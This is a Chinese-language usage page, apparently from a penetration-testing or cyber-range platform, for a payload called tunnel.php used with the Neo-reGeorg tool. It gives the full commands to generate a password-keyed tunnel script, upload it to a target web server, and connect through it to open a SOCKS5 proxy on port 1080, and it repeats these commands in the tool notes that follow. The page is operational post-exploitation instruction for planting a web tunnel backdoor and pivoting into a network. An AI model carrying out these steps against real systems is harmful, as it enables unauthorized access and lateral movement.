## 📦 载荷使用说明：tunnel.php

该载荷文件主要配合 **Neo-reGeorg** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `Neo-reGeorg` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
python3 neoreg.py generate -k password \\
  -o tunnel.php
```

**配置示例 2**：
```bash
# 上传 tunnel.php 到 Web 服务器
# 本地连接
python3 neoreg.py -k password \\
  -u http://target.com/tunnel.php \\
  -p 1080
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## Neo-reGeorg HTTP隧道

### 生成隧道脚本
```bash
python3 neoreg.py generate -k password \\
  -o tunnel.php
```

### 上传并连接
```bash
# 上传 tunnel.php 到 Web 服务器
# 本地连接
python3 neoreg.py -k password \\
  -u http://target.com/tunnel.php \\
  -p 1080
```

- 通过 HTTP/HTTPS 建立 SOCKS5 隧道
- ✓ 适合只有 Web 访问权限的场景
- ⚠ 速度较慢，适合低频操作